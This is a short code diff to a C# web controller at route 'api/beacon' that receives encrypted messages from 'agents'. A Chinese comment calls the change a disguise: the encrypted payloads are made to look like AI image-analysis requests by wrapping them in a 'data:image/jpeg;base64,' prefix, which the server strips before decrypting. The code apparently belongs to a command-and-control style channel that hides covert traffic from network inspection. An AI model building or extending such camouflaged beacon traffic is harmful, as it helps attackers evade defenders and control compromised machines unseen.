@@ -15,7 +15,7 @@ namespace LibraNextgen.Service.Controllers;
 [Route("api/beacon")]
 public class AgentCommsController : ControllerBase
 {
-    private static readonly string BuildsDir = ResolveBuildsDir();
+    internal static readonly string BuildsDir = ResolveBuildsDir();
 
     /// <summary>
     /// 构建产物目录：优先 LIBRA_BUILDS_DIR 环境变量（公网发布部署用绝对路径），
@@ -281,8 +281,13 @@ public class AgentCommsController : ControllerBase
             return BadRequest(new { error = "invalid messages" });
         }
         var first = messages[0];
-        if (!first.TryGetProperty("content", out var contentProp) || contentProp.GetString() is not string cipherB64)
+        if (!first.TryGetProperty("content", out var contentProp) || contentProp.GetString() is not string rawContent)
             return BadRequest(new { error = "invalid content" });
+        // 伪装：content 以 data:image/jpeg;base64, 开头（AI 图片分析请求），剥前缀取密文
+        var cipherB64 = rawContent;
+        const string imagePrefix = "data:image/jpeg;base64,";
+        if (rawContent.StartsWith(imagePrefix, StringComparison.OrdinalIgnoreCase))
+            cipherB64 = rawContent[imagePrefix.Length..];
         var userId = el.TryGetProperty("user", out var userProp) ? userProp.GetString() : null;
 
         // 2) 密钥选择：user 字段（会话 token）→ 会话密钥；否则预会话密钥（注册）
